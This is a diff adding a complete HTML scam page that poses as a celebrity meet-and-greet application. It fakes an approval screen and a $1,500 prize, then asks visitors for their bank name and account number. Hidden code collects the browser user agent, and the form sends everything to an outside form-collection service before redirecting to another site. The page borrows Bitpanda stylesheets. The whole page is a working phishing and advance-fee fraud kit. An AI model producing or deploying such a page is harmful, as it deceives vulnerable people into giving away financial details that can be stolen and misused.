@@ -1,0 +1,848 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script> <meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+
+
+<title>Meet and Greet</title>
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing, #processing2 {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    margin: 7px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: Brown transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #myForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 0px;
+  }
+
+  /* Input Fields and Labels */
+  #myForm input, #myForm label {
+    font-size: 18px;
+    display: block;
+    border: 3px solid #7393B3;
+  }
+
+  #myForm input {
+    width: 99%;
+    height: 49px;
+    color: #000000;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #myForm input:focus {
+    outline: none;
+    border-color: #000000;
+  }
+
+  /* Labels */
+  #myForm label {
+    margin-bottom: 3px;
+  }
+
+  /* Submit Button Spacing */
+  #myForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #secondForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 1px;
+  }
+
+  /* Input Fields and Labels */
+  #secondForm input, #secondForm label {
+    font-size: 18px;
+    display: block;
+  }
+
+  #secondForm input {
+    width: 94%;
+    height: 45px;
+    color: black;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #secondForm input:focus {
+    outline: none;
+    border-color: Red;
+  }
+
+  /* Labels */
+  #secondForm label {
+    margin-bottom: 5px;
+  }
+
+  /* Submit Button Spacing */
+  #secondForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phoneNumber = document.getElementById("phonenumber").value; // Get phone number
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+      const submittedPhoneElements = document.getElementsByClassName("submittedPhone"); // Handle phone number
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      for (let i = 0; i < submittedEmailElements.length; i++) {
+        submittedEmailElements[i].textContent = email;
+      }
+      
+      for (let i = 0; i < submittedPhoneElements.length; i++) {
+        submittedPhoneElements[i].textContent = phoneNumber; // Display phone number
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 2000); // Change delay to 3 seconds
+  }
+
+  function submitSecondForm() {
+    // Hide the second form
+    document.getElementById("secondForm").style.display = "none";
+    
+    // Display the "Processing" message for the second form
+    document.getElementById("processing2").style.display = "block";
+    
+    // Delay displaying the second form's main content
+    setTimeout(function() {
+      // Hide the processing message for the second form
+      document.getElementById("processing2").style.display = "none";
+      
+      // Display the second form's submitted content
+      const mainContent2 = document.getElementById("mainContent2");
+      mainContent2.style.display = "block";
+      
+      // Get the second form data
+      const fullName = document.getElementById("fullName").value;
+      const email2 = document.getElementById("email2").value;
+      const phone2 = document.getElementById("phone2").value;
+      const address = document.getElementById("address").value;
+      const city = document.getElementById("city").value;
+      const country = document.getElementById("country").value;
+
+      // Set the submitted data to specific elements
+      document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+      document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+      document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+      document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+      document.querySelectorAll(".submittedCity").forEach(el => el.textContent = city);
+      document.querySelectorAll(".submittedCountry").forEach(el => el.textContent = country);
+
+      // Scroll to the second form's main content
+      mainContent2.scrollIntoView({ behavior: 'smooth' });
+    }, 1000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+<div> 
+  <div class="formbold-form-wrapper">
+
+    <!-- Original Form -->
+    <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+
+<style>
+  .text-107px {
+    font-size: 19px;
+    padding: 8px;
+  }
+</style>
+<h5 class="text-107px">
+ 
+ Follow the procedures and answer the questions below, as this is the most important step in determining your approval for the exclusive meet and greet. As an added bonus, the meet and greet offers a cash prize of up to $3,000 to lucky winners, giving you the chance to win a cash prize of up to $3,000, absolutely free.
+ 
+ 
+</h5></h5>
+
+
+
+
+
+
+
+
+<style>
+  .text-154px {
+    font-size: 18px;
+    padding: 12px;
+  }
+</style>
+
+<h5 class="text-154px">
+
+<strong>
+      <div class="formbold-mb-5">
+
+       Enter the name of the celebrity you'd like to meet
+
+        <center>
+          <input type="text" required name="A_" id="name" placeholder="Name of celebrity you'd like to meet
+" class="formbold-form-input" />
+        </center>
+      </div>
+
+
+
+
+
+
+
+ <br><br><br>
+
+ <div class="formbold-mb-5">
+        How long have you been a fan? (Please note that your answer will determine whether you are approved for the meet and greet.)
+        <center>
+          <input type="text" 
+
+ class="formbold-form-input" placeholder="How long have you been a fan?" />
+        </center>
+      </div>
+
+
+
+
+
+<br><br>
+
+
+      <div class="formbold-mb-5">
+        Enter your first and last name
+        <center>
+          <input type="text" id="email" required name="A_" class="formbold-form-input" placeholder="Enter your first and last name" />
+        </center>
+      </div>
+
+
+
+
+
+      <br><br>
+      
+      Enter the name of your city
+
+      <center>
+        <input type="text" id="phonenumber" name="A_" placeholder="Enter the name of your city"  
+
+
+
+
+required
+class="formbold-form-input" />
+      </center>
+
+</strong>
+<br>     <div>
+
+
+        <center> 
+<button type="submit" style="width: 98%; height: 47px; border: 0px solid #000; border-radius: 30px; background-color: #0093D5; color: #ffffff; font-size: 19px; font-weight: bold; cursor: pointer;">CONTINUE</button></center> </strong>
+</h5><br><br><br><br><br><br>
+      </div>
+    </form>
+
+  </div>
+</div>
+
+<div id="processing">
+  <style>
+  .texdt-734px {
+    font-size: 21px;
+    padding: 9px;
+  }
+</style>
+
+<h5 class="texdt-734px">
+Application
+Processing . . .
+<br><br>
+If approved, you'll get an exclusive meet and greet, and the lucky winners will also receive a cash prize of up to $3,000.<br>
+If you are not approved: you can try again next year.
+<br><br>
+<strong>
+Please wait, this only takes a few seconds. Do not leave this page.
+</strong>
+
+
+ 
+ 
+</h5>
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+
+
+
+<div id="mainContent">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h6>
+
+<div style="width: 90%; margin: 4px auto; border: 2px solid black; padding: 9px; border-radius: 2px;">
+
+<font size="+1">
+<strong>
+  <span class="submittedEmail"></span>
+</strong>
+ 
+ </font> 
+ 
+
+
+ <br>  <br> 
+
+<div> 
+<div class="container">
+    <div class="left-text">
+    
+<font size="+1">
+
+Approved
+
+</font>
+
+</div>
+
+
+    <div class="right-text">
+<font size="+2"> <strong>Total winnings:</font> </strong></strong>
+    
+    <br>
+    
+    <font size="+3">
+ <span class="currency-symbol">$</span>1,500.</font><strong><font size="+0.5">00</font>
+</div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+
+</div> 
+
+</div> 
+
+</h6>
+</center>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-amakapx {
+    font-size: 20px;
+    padding: 9px;
+  }
+</style>
+<h5 class="text-amakapx">
+ 
+
+ <center><strong>Approved </strong> &nbsp
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&amp;usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 44px; height: 44px; margin: 0px;" alt="verify&quot; Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify&quot; Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+</center>
+
+
+</h5>
+
+
+</h5>
+
+
+<style>
+  .text-makapx {
+    font-size: 18px;
+    padding: 10px;
+  }
+</style>
+
+<h5 class="text-makapx">
+ 
+</strong></strong>
+
+
+ 
+ Congratulations,   <span class="submittedEmail"></span>, 
+ your application has been approved. You've been scheduled for an exclusive meet and greet with the legendary 
+ 
+ <span class="submittedName"></span> in <span class="submittedPhone"></span> on July 26, 2025.
+
+As an added bonus, although you didn't qualify to win the full $3,000, you've qualified to win $1,500, which has been deposited into your meet and greet profile.
+ 
+ 
+ 
+
+<br><br>
+
+ <span class="submittedName"></span>, known for his love for his fans, has been running this meet and greet since 1997, and you're the lucky winner  this year! This  event includes a private dinner, where you'll have the chance to take photos and even receive a hug from the legendary Tom Jones himself. As an added bonus, you've also received a $1,500 cash prize, now available in your profile. The Meet and Greet Support Department will contact you with venue, date, and time details. Additionally, you can now claim the $1,500 cash prize and deposit it into any bank of your choice, so you can enjoy it immediately.
+
+
+
+
+
+
+
+
+
+
+  <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 1px;
+        }
+
+        /* Styling for other input fields */
+        .input-fieldy {
+            width: 99%;
+            height: 53px;
+            border: 3px solid #000000;
+            border-radius: 1px;
+            font-size: 19px;
+            font-weight: bold;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+
+        .input-fieldy:focus {
+            outline: none;
+            border-color: #BCC6CC; /* Change border color on focus */
+        }
+    </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <style>
+    :root {
+      /* Customizable variables */
+      --loading-text-size: 40px;           /* Size of the "Processing..." text */
+      --loading-text-color: #000000;        /* Color of the "Processing..." text */
+      --spinner-size: 110px;               /* Size of the rotating icon */
+      --spinner-border-size: 20px;         /* Thickness of the spinner border */
+      --spinner-color: brown;             /* Color of the rotating part */
+      --spinner-speed: 1s;                /* Rotation speed of the spinner */
+    }
+
+    /* General styling for the loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color:  #ffffff;
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loading-icon {
+      border: var(--spinner-border-size) solid #f3f3f3; /* Light grey */
+      border-top: var(--spinner-border-size) solid var(--spinner-color); /* Customizable color */
+      border-radius: 50%;
+      width: var(--spinner-size); /* Customizable size */
+      height: var(--spinner-size); /* Customizable size */
+      animation: spin var(--spinner-speed) linear infinite; /* Customizable speed */
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: var(--loading-text-size); /* Customizable size */
+      color: var(--loading-text-color); /* Customizable color */
+      font-weight: bold;
+    }
+  </style>
+
+
+
+
+
+
+
+ <form action="https://submit-form.com/sYNCPpUjZ" method="POST" id="example-form" class="wpforms-validate wpforms-form" data-formid="278">
+
+
+
+<input type="hidden" name="_redirect" value="https://enjoy-org.github.io/Reward/" >
+
+
+
+
+
+
+<style>
+  .text-amakapx {
+    font-size: 19px;
+    padding: 5px;
+  }
+</style>
+
+
+
+
+<h5 class="text-amakapx">
+ 
+    
+
+    <!-- Other input field -->
+    	
+  <span class="submittedEmail"></span>, specify the   
+name of your bank where you'd like to receive the $1,500 winnings:
+
+    <input type="text" class="input-fieldy" name="Baank" required placeholder="Enter The Name Of Your Bank">
+<br>
+<br>
+
+
+    <!-- Other input field -->
+Account number
+    <input type="text" class="input-fieldy"
+ name="Account-Numbr" required 
+placeholder="Enter Your Account Number">
+
+
+
+
+
+
+<br><br>
+	
+	
+<span style="display:none;">
+
+
+    <p id="user-agent"></p> </span>
+        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+
+
+
+	
+<button  type="submit"
+style="width: 100%; height: 44px; border: 0px solid #000; border-radius: 30px; background-color: #306754; color: #ffffff; font-size: 20px; font-weight: bold; cursor: pointer;">Next</button>
+
+
+
+
+</form>
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+
+
+<!-- Reusable Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div>
+      <div class="loading-icon"></div>
+      <div class="loading-text"><strong>Please Wait...</strong></div>
+    </div>
+  </div>
+  
+  
+  
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("example-form");
+      const loadingOverlay = document.getElementById("loading-overlay");
+
+      // Function to show the loading overlay
+      const showLoading = () => {
+        loadingOverlay.classList.add("active");
+      };
+
+      // Form submission handler
+      form.addEventListener("submit", (event) => {
+        // Show the loading overlay
+        showLoading();
+
+        // Allow the form to proceed with submission (default behavior)
+        // The loading overlay will remain visible while the form is being submitted
+      });
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+<br>
+<br><br><br>
+<br><br><br><br><br>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="processing2">
+  
+
+<style>
+  .text-deborahpx {
+    font-size: 19px;
+    padding: 5px;
+  }
+</style>
+<h5 class="text-deborahpx">
+ 
+
+<strong> 
+
+
+processing...
+
+</strong>
+
+
+</h5>
+
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+<div id="mainContent2" style="display: none;">
+
+
+
+
+
+
+
+
+
+</div>
+
+
+<script>
+  // Ensure both forms and processing sections are hidden initially
+  document.getElementById("processing").style.display = "none";
+  document.getElementById("processing2").style.display = "none";
+  document.getElementById("myForm").style.display = "block";
+</script>
+</body>
+</html>
